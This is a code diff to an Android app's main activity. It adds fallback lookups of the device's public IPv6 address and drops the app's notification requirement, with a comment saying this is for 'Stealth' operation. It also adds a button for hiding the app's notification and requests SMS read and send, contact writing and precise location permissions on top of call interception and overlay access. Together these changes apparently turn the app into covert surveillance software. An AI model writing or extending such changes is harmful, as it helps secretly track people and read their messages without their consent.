@@ -74,6 +74,10 @@ public class MainActivity extends AppCompatActivity {
         findViewById(R.id.btnBatteryOptimization).setOnClickListener(v -> {
             requestBatteryOptimization();
         });
+
+        findViewById(R.id.btnHideNotification).setOnClickListener(v -> {
+            openNotificationSettings();
+        });
     }
 
     private void requestBatteryOptimization() {
@@ -185,16 +189,32 @@ public class MainActivity extends AppCompatActivity {
         ExecutorService executor = Executors.newSingleThreadExecutor();
         executor.execute(() -> {
             String publicIp = null;
-            try {
-                URL url = new URL("https://api64.ipify.org");
-                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-                urlConnection.setConnectTimeout(5000);
-                urlConnection.setReadTimeout(5000);
-                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
-                publicIp = in.readLine();
-                in.close();
-            } catch (Exception e) {
-                e.printStackTrace();
+
+            // List of services to try
+            String[] services = {
+                    "https://api64.ipify.org",
+                    "https://ipv6.icanhazip.com",
+                    "https://v6.ident.me"
+            };
+
+            for (String serviceUrl : services) {
+                try {
+                    URL url = new URL(serviceUrl);
+                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
+                    urlConnection.setConnectTimeout(3000);
+                    urlConnection.setReadTimeout(3000);
+                    // Add User-Agent to avoid being blocked by some services
+                    urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
+                    BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+                    publicIp = in.readLine();
+                    in.close();
+
+                    if (publicIp != null && !publicIp.trim().isEmpty()) {
+                        break; // Found one!
+                    }
+                } catch (Exception e) {
+                    // Try next service
+                }
             }
 
             // If external fetch fails, try to find a global unicast address locally
@@ -221,7 +241,26 @@ public class MainActivity extends AppCompatActivity {
                         if (idx >= 0) {
                             ip = ip.substring(0, idx);
                         }
-                        // Skip link-local addresses (fe80::)
+
+                        // Check for Global Unicast Address (2000::/3)
+                        // This usually starts with 2 or 3
+                        if (ip.startsWith("2") || ip.startsWith("3")) {
+                            return ip;
+                        }
+                    }
+                }
+            }
+
+            // Second pass: accept any non-link-local if no GUA found
+            for (NetworkInterface intf : interfaces) {
+                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
+                for (InetAddress addr : addrs) {
+                    if (!addr.isLoopbackAddress() && addr instanceof Inet6Address) {
+                        String ip = addr.getHostAddress();
+                        int idx = ip.indexOf('%');
+                        if (idx >= 0) {
+                            ip = ip.substring(0, idx);
+                        }
                         if (!ip.toLowerCase().startsWith("fe80")) {
                             return ip;
                         }
@@ -241,11 +280,8 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void checkAndEnforceRequirements() {
-        // 1. Check Notification Permission/Status
-        if (!areNotificationsEnabled()) {
-            showNotificationPermissionDialog();
-            return; // invalid state
-        }
+        // 1. Remove Strict Notification Enforcement for "Stealth" Operation
+        // We will not block the app if notifications are disabled.
 
         // 2. Check Special Permissions (Storage Manager & Overlays)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -296,37 +332,17 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private boolean areNotificationsEnabled() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            return ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
+    private void openNotificationSettings() {
+        Intent intent = new Intent();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            intent.setAction(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
+            intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
         } else {
-            return androidx.core.app.NotificationManagerCompat.from(this).areNotificationsEnabled();
+            intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
+            intent.putExtra("app_package", getPackageName());
+            intent.putExtra("app_uid", getApplicationInfo().uid);
         }
-    }
-
-    private void showNotificationPermissionDialog() {
-        new android.app.AlertDialog.Builder(this)
-                .setTitle("Notifications Required")
-                .setMessage(
-                        "This app requires notifications to be enabled to function correctly. Please enable them in settings.")
-                .setCancelable(false)
-                .setPositiveButton("Go to Settings", (dialog, which) -> {
-                    Intent intent = new Intent();
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        intent.setAction(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
-                        intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
-                    } else {
-                        intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
-                        intent.putExtra("app_package", getPackageName());
-                        intent.putExtra("app_uid", getApplicationInfo().uid);
-                    }
-                    startActivity(intent);
-                })
-                .setNegativeButton("Close App", (dialog, which) -> {
-                    finishAffinity();
-                })
-                .show();
+        startActivity(intent);
     }
 
     private List<String> getMissingPermissions() {
@@ -367,6 +383,27 @@ public class MainActivity extends AppCompatActivity {
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED)
             permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
+
+        // SMS permissions
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(Manifest.permission.READ_SMS);
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(Manifest.permission.SEND_SMS);
+
+        // Contacts write
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(Manifest.permission.WRITE_CONTACTS);
+
+        // Location
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
 
         return permissionsNeeded;
     }
